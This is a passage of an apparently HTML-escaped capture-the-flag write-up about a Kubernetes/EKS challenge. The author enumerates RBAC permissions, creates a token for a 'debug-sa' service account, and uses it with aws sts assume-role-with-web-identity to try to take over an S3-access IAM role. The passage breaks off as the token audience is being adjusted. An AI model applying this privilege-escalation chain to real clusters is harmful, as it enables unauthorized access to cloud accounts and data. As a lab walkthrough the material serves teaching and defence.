have?\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecan-i\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--list\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewarning:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ethe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elist\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003emay\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ebe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eincomplete:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ewebhook\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauthorizer\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edoes\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enot\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esupport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003euser\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erule\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eresolution\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eResources\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                       \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNon-Resource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eURLs\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eResource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNames\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eVerbs\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eserviceaccounts/token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                           []                  [debug-sa]         [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectaccessreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   []                  []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectrulesreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    []                  []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epods\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                            []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003esecrets\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                         []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eserviceaccounts\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                 []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api]              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis]             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]        []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]         []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]         []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epodsecuritypolicies.policy\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                      []                  [eks.privileged]   [use]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHmm, being able to create tokens for the \u003ccode\u003edebug-sa\u003c/code\u003e resource definitely seems\nsuspicious. So lets see if that will get us anywhere:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eTOKEN=$(\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e create token debug-sa)\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e $TOKEN \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecan-i\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--list\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewarning:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ethe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elist\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003emay\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ebe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eincomplete:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ewebhook\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauthorizer\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edoes\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enot\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esupport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003euser\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erule\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eresolution\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eResources\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                       \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNon-Resource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eURLs\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eResource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNames\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eVerbs\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectaccessreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   []                                    []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectrulesreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    []                                    []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/.well-known/openid-configuration]   []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api]                                []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis]                               []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openid/v1/jwks]                     []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]                           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]                           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epodsecuritypolicies.policy\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                      []                                    [eks.privileged]   [use]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like we have less access than before.  So not too helpful, lets take a\nlook at that service account we want to become:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esa\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003es3access-sa\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"v1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ServiceAccount\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"metadata\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"annotations\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"eks.amazonaws.com/role-arn\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:iam::688655246681:role/challengeEksS3Role\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"creationTimestamp\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-10-31T20:07:34Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"name\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"s3access-sa\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"namespace\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"challenge5\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"resourceVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"671916\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"uid\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"86e44c49-b05a-4ebe-800b-45183a6ebbda\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI think we are going to need to use our AWS access to assume that role, I don't\nbelieve our kubernetes access is going to get us anywhere:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eassume-role\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-arn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003earn:aws:iam::688655246681:role/challengeEksS3Role\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-session-name\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003etest\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eAn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eerror\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eoccurred\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, so \u003cem\u003emaybe\u003c/em\u003e our kubernetes access is important since we can't assume the role\ndirectly.   Lets try to use that $TOKEN from \u003ccode\u003edebug-sa\u003c/code\u003e to assume the role:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eassume-role-with-web-identity\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-arn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003earn:aws:iam::688655246681:role/challengeEksS3Role\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-session-name\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003etest\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--web-identity-token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e $TOKEN\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eAn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eerror\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eoccurred\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGetting closer!   The default audience for a token created with \u003ccode\u003ekubectl\u003c/code\u003e is\n\u003ccode\u003ehttps://kubernetes.default.svc\u003c/code\u003e which amazon doesn't seem to like.  Lets try\ncreating it again with \u003ccode\u003ests.amazonaws.com\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: 